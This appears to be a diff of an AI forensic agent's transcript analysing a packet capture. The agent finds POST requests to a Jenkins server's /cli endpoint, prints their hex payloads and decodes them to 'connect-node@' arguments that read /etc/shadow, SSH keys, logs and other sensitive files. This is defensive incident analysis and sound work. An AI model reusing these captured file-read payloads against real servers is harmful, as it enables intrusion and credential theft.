@@ -1,69 +1,157 @@
 TOOL CALL:
 - tool name: command_executor
 - args: {
-  "tshark_command": "-Y \"http.response && tcp.port == 8080\" -T fields -e http.response.line -e http.server"
+  "tshark_command": "-Y \"http\" -T fields -e frame.number -e ip.src -e ip.dst -e http.request.method -e http.request.uri -e http.response.code"
 }
 
 ---
 
 
-Result of command {'tshark_command': '-Y "http.response && tcp.port == 8080" -T fields -e http.response.line -e http.server'}:  Date: Wed, 25 Sep 2024 12:33:37 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Content-Type: text/html;charset=utf-8\r\n,Expires: Thu, 01 Jan 1970 00:00:00 GMT\r\n,Cache-Control: no-cache,no-store,must-revalidate\r\n,X-Hudson-Theme: default\r\n,Referrer-Policy: same-origin\r\n,Cross-Origin-Opener-Policy: same-origin\r\n,Set-Cookie: JSESSIONID.bf00783a=node0patdb5gil61v11nkmv8t5k7vn0.node0; Path=/; HttpOnly\r\n,X-Hudson: 1.395\r\n,X-Jenkins: 2.441\r\n,X-Jenkins-Session: 5eb87f0c\r\n,X-Frame-Options: sameorigin\r\n,Content-Encoding: gzip\r\n,Content-Length: 3014\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:33:37 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Transfer-Encoding: chunked\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:33:53 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Transfer-Encoding: chunked\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:33:54 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Content-Length: 0\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:33:55 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Transfer-Encoding: chunked\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:33:56 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Content-Length: 0\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:33:57 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Transfer-Encoding: chunked\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:33:57 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Content-Length: 0\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:33:58 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Transfer-Encoding: chunked\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:33:58 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Content-Length: 0\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:33:59 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Transfer-Encoding: chunked\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:34:00 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Content-Length: 0\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:34:01 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Transfer-Encoding: chunked\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:34:01 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Content-Length: 0\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:34:02 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Transfer-Encoding: chunked\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:34:02 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Content-Length: 0\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:34:04 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Transfer-Encoding: chunked\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:34:04 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Content-Length: 0\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:34:05 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Transfer-Encoding: chunked\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:34:05 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Content-Length: 0\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
+Result of command {'tshark_command': '-Y "http" -T fields -e frame.number -e ip.src -e ip.dst -e http.request.method -e http.request.uri -e http.response.code'}:  341	172.18.0.1	172.18.0.2	POST	/cli?remoting=false	
+346	172.18.0.1	172.18.0.2	POST	/cli?remoting=false	
+350	172.18.0.2	172.18.0.1		/cli?remoting=false	500
+357	172.18.0.2	172.18.0.1		/cli?remoting=false	200
+365	172.18.0.1	172.18.0.2	POST	/cli?remoting=false	
+372	172.18.0.1	172.18.0.2	POST	/cli?remoting=false	
+418	172.18.0.2	172.18.0.1		/cli?remoting=false	200
+420	172.18.0.2	172.18.0.1		/cli?remoting=false	200
+431	172.18.0.1	172.18.0.2	POST	/cli?remoting=false	
+438	172.18.0.1	172.18.0.2	POST	/cli?remoting=false	
+460	172.18.0.2	172.18.0.1		/cli?remoting=false	200
+462	172.18.0.2	172.18.0.1		/cli?remoting=false	200
+473	172.18.0.1	172.18.0.2	POST	/cli?remoting=false	
+480	172.18.0.1	172.18.0.2	POST	/cli?remoting=false	
+488	172.18.0.2	172.18.0.1		/cli?remoting=false	200
+490	172.18.0.2	172.18.0.1		/cli?remoting=false	200
+501	172.18.0.1	172.18.0.2	POST	/cli?remoting=false	
+510	172.18.0.1	172.18.0.2	POST	/cli?remoting=false	
+597	172.18.0.2	172.18.0.1		/cli?remoting=false	200
+599	172.18.0.2	172.18.0.1		/cli?remoting=false	200
+610	172.18.0.1	172.18.0.2	POST	/cli?remoting=false	
+617	172.18.0.1	172.18.0.2	POST	/cli?remoting=false	
+635	172.18.0.2	172.18.0.1		/cli?remoting=false	200
+637	172.18.0.2	172.18.0.1		/cli?remoting=false	200
+648	172.18.0.1	172.18.0.2	POST	/cli?remoting=false	
+657	172.18.0.1	172.18.0.2	POST	/cli?remoting=false	
+675	172.18.0.2	172.18.0.1		/cli?remoting=false	200
+677	172.18.0.2	172.18.0.1		/cli?remoting=false	200
+688	172.18.0.1	172.18.0.2	POST	/cli?remoting=false	
+695	172.18.0.1	172.18.0.2	POST	/cli?remoting=false	
+713	172.18.0.2	172.18.0.1		/cli?remoting=false	200
+715	172.18.0.2	172.18.0.1		/cli?remoting=false	200
+726	172.18.0.1	172.18.0.2	POST	/cli?remoting=false	
+733	172.18.0.1	172.18.0.2	POST	/cli?remoting=false	
+751	172.18.0.2	172.18.0.1		/cli?remoting=false	200
+753	172.18.0.2	172.18.0.1		/cli?remoting=false	200
+764	172.18.0.1	172.18.0.2	POST	/cli?remoting=false	
+771	172.18.0.1	172.18.0.2	POST	/cli?remoting=false	
+789	172.18.0.2	172.18.0.1		/cli?remoting=false	200
+791	172.18.0.2	172.18.0.1		/cli?remoting=false	200
 
+
+---
+
+TOOL CALL:
+- tool name: command_executor
+- args: {
+  "tshark_command": "-Y \"http.request.method == POST\" -T fields -e frame.number -e ip.src -e ip.dst -e http.file_data"
+}
+
+---
+
+
+Result of command {'tshark_command': '-Y "http.request.method == POST" -T fields -e frame.number -e ip.src -e ip.dst -e http.file_data'}:  341	172.18.0.1	172.18.0.2	
+346	172.18.0.1	172.18.0.2	0000000e00000c636f6e6e6563742d6e6f64650000000e00000c402f6574632f70617373776403
+365	172.18.0.1	172.18.0.2	
+372	172.18.0.1	172.18.0.2	0000000e00000c636f6e6e6563742d6e6f64650000000e00000c402f6574632f736861646f7703
+431	172.18.0.1	172.18.0.2	
+438	172.18.0.1	172.18.0.2	0000000e00000c636f6e6e6563742d6e6f64650000000d00000b402f6574632f686f73747303
+473	172.18.0.1	172.18.0.2	
+480	172.18.0.1	172.18.0.2	0000000e00000c636f6e6e6563742d6e6f64650000001000000e402f6574632f686f73746e616d6503
+501	172.18.0.1	172.18.0.2	
+510	172.18.0.1	172.18.0.2	0000000e00000c636f6e6e6563742d6e6f64650000000d00000b402f6574632f67726f757003
+610	172.18.0.1	172.18.0.2	
+617	172.18.0.1	172.18.0.2	0000000e00000c636f6e6e6563742d6e6f646500000016000014402f726f6f742f2e626173685f686973746f727903
+648	172.18.0.1	172.18.0.2	
+657	172.18.0.1	172.18.0.2	0000000e00000c636f6e6e6563742d6e6f64650000001d00001b402f726f6f742f2e7373682f617574686f72697a65645f6b65797303
+688	172.18.0.1	172.18.0.2	
+695	172.18.0.1	172.18.0.2	0000000e00000c636f6e6e6563742d6e6f646500000012000010402f7661722f6c6f672f7379736c6f6703
+726	172.18.0.1	172.18.0.2	
+733	172.18.0.1	172.18.0.2	0000000e00000c636f6e6e6563742d6e6f646500000014000012402f7661722f6c6f672f617574682e6c6f6703
+764	172.18.0.1	172.18.0.2	
+771	172.18.0.1	172.18.0.2	0000000e00000c636f6e6e6563742d6e6f64650000001b000019402f7661722f7777772f68746d6c2f636f6e6669672e70687003
+
+
+---
+
+The extracted HTTP POST request payloads contain raw data that appears to be encoded in hexadecimal format. To further analyze the data being sent, I will translate this raw payload data from hexadecimal to ASCII. This translation will help identify any unauthorized access or data exfiltration attempts by revealing the actual content of the requests.
+
+Let's translate the hexadecimal payloads to ASCII:
+
+1. `0000000e00000c636f6e6e6563742d6e6f64650000000e00000c402f6574632f70617373776403`
+2. `0000000e00000c636f6e6e6563742d6e6f64650000000e00000c402f6574632f736861646f7703`
+3. `0000000e00000c636f6e6e6563742d6e6f64650000000d00000b402f6574632f686f73747303`
+4. `0000000e00000c636f6e6e6563742d6e6f64650000001000000e402f6574632f686f73746e616d6503`
+5. `0000000e00000c636f6e6e6563742d6e6f64650000000d00000b402f6574632f67726f757003`
+6. `0000000e00000c636f6e6e6563742d6e6f646500000016000014402f726f6f742f2e626173685f686973746f727903`
+7. `0000000e00000c636f6e6e6563742d6e6f64650000001d00001b402f726f6f742f2e7373682f617574686f72697a65645f6b65797303`
+8. `0000000e00000c636f6e6e6563742d6e6f646500000012000010402f7661722f6c6f672f7379736c6f6703`
+9. `0000000e00000c636f6e6e6563742d6e6f646500000014000012402f7661722f6c6f672f617574682e6c6f6703`
+10. `0000000e00000c636f6e6e6563742d6e6f64650000001b000019402f7661722f7777772f68746d6c2f636f6e6669672e70687003`
+
+I will now translate these hexadecimal strings to ASCII.
+Here are the translations of the hexadecimal payloads to ASCII:
+
+1. `0000000e00000c636f6e6e6563742d6e6f64650000000e00000c402f6574632f70617373776403` translates to: `connect-node@/etc/passwd`
+2. `0000000e00000c636f6e6e6563742d6e6f64650000000e00000c402f6574632f736861646f7703` translates to: `connect-node@/etc/shadow`
+3. `0000000e00000c636f6e6e6563742d6e6f64650000000d00000b402f6574632f686f73747303` translates to: `connect-node@/etc/hosts`
+4. `0000000e00000c636f6e6e6563742d6e6f64650000001000000e402f6574632f686f73746e616d6503` translates to: `connect-node@/etc/hostname`
+5. `0000000e00000c636f6e6e6563742d6e6f64650000000d00000b402f6574632f67726f757003` translates to: `connect-node@/etc/group`
+6. `0000000e00000c636f6e6e6563742d6e6f646500000016000014402f726f6f742f2e626173685f686973746f727903` translates to: `connect-node@/root/.bash_history`
+7. `0000000e00000c636f6e6e6563742d6e6f64650000001d00001b402f726f6f742f2e7373682f617574686f72697a65645f6b65797303` translates to: `connect-node@/root/.ssh/authorized_keys`
+8. `0000000e00000c636f6e6e6563742d6e6f646500000012000010402f7661722f6c6f672f7379736c6f6703` translates to: `connect-node@/var/log/syslog`
+9. `0000000e00000c636f6e6e6563742d6e6f646500000014000012402f7661722f6c6f672f617574682e6c6f6703` translates to: `connect-node@/var/log/auth.log`
+10. `0000000e00000c636f6e6e6563742d6e6f64650000001b000019402f7661722f7777772f68746d6c2f636f6e6669672e70687003` translates to: `connect-node@/var/www/html/config.php`
+
+These translations reveal that the HTTP POST requests are attempting to access sensitive files and directories on the server, such as `/etc/passwd`, `/etc/shadow`, and `/root/.ssh/authorized_keys`. This behavior is highly indicative of unauthorized access attempts or data exfiltration activities.
+
+I will now prepare the final report with the executed command and the findings.
 
 ---
 
 TOOL CALL:
 - tool name: final_answer_formatter
 - args: {
-  "report": "The analysis successfully extracted the HTTP response headers from traffic on port 8080. The 'X-Jenkins' header was found, indicating the Jenkins version as '2.441'. The 'Server' header also showed 'Jetty(10.0.18)', but the primary focus was on identifying the Jenkins version, which was achieved.",
-  "executed_command": "-Y \"http.response && tcp.port == 8080\" -T fields -e http.response.line -e http.server"
+  "report": "The analysis of the PCAP file revealed multiple HTTP POST requests to the URI `/cli?remoting=false`, with payloads attempting to access sensitive files and directories on the server. The payloads, when translated from hexadecimal to ASCII, indicated attempts to access files such as `/etc/passwd`, `/etc/shadow`, and `/root/.ssh/authorized_keys`. This behavior is indicative of unauthorized access attempts or data exfiltration activities. The executed command successfully extracted the HTTP POST request payloads, which were then translated to reveal the suspicious activities.",
+  "executed_command": "-Y \"http.request.method == POST\" -T fields -e frame.number -e ip.src -e ip.dst -e http.file_data"
 }
 
 ---
 
 Final report from the forensic expert:
-The analysis successfully extracted the HTTP response headers from traffic on port 8080. The 'X-Jenkins' header was found, indicating the Jenkins version as '2.441'. The 'Server' header also showed 'Jetty(10.0.18)', but the primary focus was on identifying the Jenkins version, which was achieved.
-Executed command: -Y "http.response && tcp.port == 8080" -T fields -e http.response.line -e http.server
+The analysis of the PCAP file revealed multiple HTTP POST requests to the URI `/cli?remoting=false`, with payloads attempting to access sensitive files and directories on the server. The payloads, when translated from hexadecimal to ASCII, indicated attempts to access files such as `/etc/passwd`, `/etc/shadow`, and `/root/.ssh/authorized_keys`. This behavior is indicative of unauthorized access attempts or data exfiltration activities. The executed command successfully extracted the HTTP POST request payloads, which were then translated to reveal the suspicious activities.
+Executed command: -Y "http.request.method == POST" -T fields -e frame.number -e ip.src -e ip.dst -e http.file_data
 
-Command output: Date: Wed, 25 Sep 2024 12:33:37 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Content-Type: text/html;charset=utf-8\r\n,Expires: Thu, 01 Jan 1970 00:00:00 GMT\r\n,Cache-Control: no-cache,no-store,must-revalidate\r\n,X-Hudson-Theme: default\r\n,Referrer-Policy: same-origin\r\n,Cross-Origin-Opener-Policy: same-origin\r\n,Set-Cookie: JSESSIONID.bf00783a=node0patdb5gil61v11nkmv8t5k7vn0.node0; Path=/; HttpOnly\r\n,X-Hudson: 1.395\r\n,X-Jenkins: 2.441\r\n,X-Jenkins-Session: 5eb87f0c\r\n,X-Frame-Options: sameorigin\r\n,Content-Encoding: gzip\r\n,Content-Length: 3014\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:33:37 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Transfer-Encoding: chunked\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:33:53 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Transfer-Encoding: chunked\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:33:54 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Content-Length: 0\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:33:55 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Transfer-Encoding: chunked\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:33:56 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Content-Length: 0\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:33:57 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Transfer-Encoding: chunked\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:33:57 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Content-Length: 0\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:33:58 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Transfer-Encoding: chunked\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:33:58 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Content-Length: 0\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:33:59 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Transfer-Encoding: chunked\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:34:00 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Content-Length: 0\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:34:01 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Transfer-Encoding: chunked\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:34:01 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Content-Length: 0\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:34:02 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Transfer-Encoding: chunked\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:34:02 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Content-Length: 0\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:34:04 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Transfer-Encoding: chunked\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:34:04 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Content-Length: 0\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:34:05 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Transfer-Encoding: chunked\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
-Date: Wed, 25 Sep 2024 12:34:05 GMT\r\n,X-Content-Type-Options: nosniff\r\n,Hudson-Duplex: true\r\n,Content-Length: 0\r\n,Server: Jetty(10.0.18)\r\n	Jetty(10.0.18)
+Command output: 341	172.18.0.1	172.18.0.2	
+346	172.18.0.1	172.18.0.2	0000000e00000c636f6e6e6563742d6e6f64650000000e00000c402f6574632f70617373776403
+365	172.18.0.1	172.18.0.2	
+372	172.18.0.1	172.18.0.2	0000000e00000c636f6e6e6563742d6e6f64650000000e00000c402f6574632f736861646f7703
+431	172.18.0.1	172.18.0.2	
+438	172.18.0.1	172.18.0.2	0000000e00000c636f6e6e6563742d6e6f64650000000d00000b402f6574632f686f73747303
+473	172.18.0.1	172.18.0.2	
+480	172.18.0.1	172.18.0.2	0000000e00000c636f6e6e6563742d6e6f64650000001000000e402f6574632f686f73746e616d6503
+501	172.18.0.1	172.18.0.2	
+510	172.18.0.1	172.18.0.2	0000000e00000c636f6e6e6563742d6e6f64650000000d00000b402f6574632f67726f757003
+610	172.18.0.1	172.18.0.2	
+617	172.18.0.1	172.18.0.2	0000000e00000c636f6e6e6563742d6e6f646500000016000014402f726f6f742f2e626173685f686973746f727903
+648	172.18.0.1	172.18.0.2	
+657	172.18.0.1	172.18.0.2	0000000e00000c636f6e6e6563742d6e6f64650000001d00001b402f726f6f742f2e7373682f617574686f72697a65645f6b65797303
+688	172.18.0.1	172.18.0.2	
+695	172.18.0.1	172.18.0.2	0000000e00000c636f6e6e6563742d6e6f646500000012000010402f7661722f6c6f672f7379736c6f6703
+726	172.18.0.1	172.18.0.2	
+733	172.18.0.1	172.18.0.2	0000000e00000c636f6e6e6563742d6e6f646500000014000012402f7661722f6c6f672f617574682e6c6f6703
+764	172.18.0.1	172.18.0.2	
+771	172.18.0.1	172.18.0.2	0000000e00000c636f6e6e6563742d6e6f64650000001b000019402f7661722f7777772f68746d6c2f636f6e6669672e70687003
 
 
 
